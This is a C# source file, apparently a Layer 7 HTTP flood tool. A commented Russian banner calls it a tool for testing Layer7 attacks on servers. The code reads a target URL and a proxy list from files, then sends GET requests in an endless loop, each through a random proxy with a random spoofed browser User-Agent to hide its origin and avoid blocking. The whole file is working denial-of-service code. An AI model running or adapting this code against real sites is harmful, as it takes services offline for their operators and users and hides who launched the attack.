using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace httpboostercore
{
    class ThreadTest
    {

        public void WriteY()
        {

            List<string> UserAgent = new List<string>();
            UserAgent.Add("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)");
            UserAgent.Add("Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))");
            UserAgent.Add("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14");
            UserAgent.Add("Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02");
            UserAgent.Add("Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3");
            UserAgent.Add("Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27");
            UserAgent.Add("Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00");

            int UA_Index; // Индекс массива UserAgent

            Random Rand = new Random();


            List<string> Proxys = new List<string>();
            int ProxyPos = 0;

            string Pline;

            StreamReader Pfile = new StreamReader(@"proxy.txt");
            while ((Pline = Pfile.ReadLine()) != null)
            {
                Proxys.Add(Pline);
            }
            StreamReader TargetIPFle = new StreamReader(@"target.txt");
            string TargetHost;
            TargetHost = TargetIPFle.ReadLine();

            //Console.WriteLine("*** Инструмент Для Тестирование Layer7 атаки на серверы ***\nStopDDoS PRO HOSTING\n");
            string html = string.Empty;
            string url;
            url = TargetHost;

            while (ProxyPos != -1)
            {
                UA_Index = Rand.Next(0, UserAgent.Count()); // Зарандомим индекс массива UserAgent

                ProxyPos = Rand.Next(0, Proxys.Count()); // Зарандомим прокси хосты

                string IpAddress = Proxys[ProxyPos].Split(':')[0];
                string Port = Proxys[ProxyPos].Split(':')[1];


                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.AutomaticDecompression = DecompressionMethods.GZip;
                WebProxy myproxy = new WebProxy(IpAddress, Convert.ToInt32(Port))
                {
                    BypassProxyOnLocal = false
                };

                request.Proxy = myproxy;
                request.Timeout = 3000;

                request.UserAgent = UserAgent[UA_Index]; // Рандомный UserAgent из массива
                request.Method = "GET";
                request.KeepAlive = true;



                try
                {
                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                }
                catch
                {
                    Console.WriteLine("This is broken PROXY: {0}:{1}", IpAddress, Port);
                }


                Console.WriteLine("Request: From {0} >>> {2} (METHOD: GET)", IpAddress, request.Method, url);


            }
        }

    }

}
